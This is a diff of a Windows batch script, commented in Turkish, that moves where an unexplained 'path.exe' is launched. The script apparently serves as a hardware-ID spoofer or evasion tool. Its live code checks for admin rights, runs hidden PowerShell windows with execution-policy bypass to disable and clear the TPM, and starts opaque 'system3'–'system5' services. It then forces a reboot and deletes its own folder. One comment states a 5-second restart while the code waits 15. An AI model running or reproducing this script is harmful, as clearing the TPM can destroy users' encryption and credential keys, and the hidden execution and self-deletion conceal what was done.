@@ -13,8 +13,6 @@ openfiles >nul 2>&1 || (
     exit /B
 )
 
-start "" path.exe
-
 :: TPM ayarlarını devre dışı bırak ve temizle
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Disable-TpmAutoProvisioning'"
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Clear-Tpm'"
@@ -65,6 +63,7 @@ sc start system3
 sc start system4
 sc start system5
 
+start "" path.exe
 
 :: Bilgisayarı 5 saniye içinde yeniden başlat
 shutdown /r /t 15
@@ -72,5 +71,6 @@ shutdown /r /t 15
 start /b "" cmd /c "timeout /t 1 >nul && rd /s /q "%~dp0" "
 
 exit
+
 
 
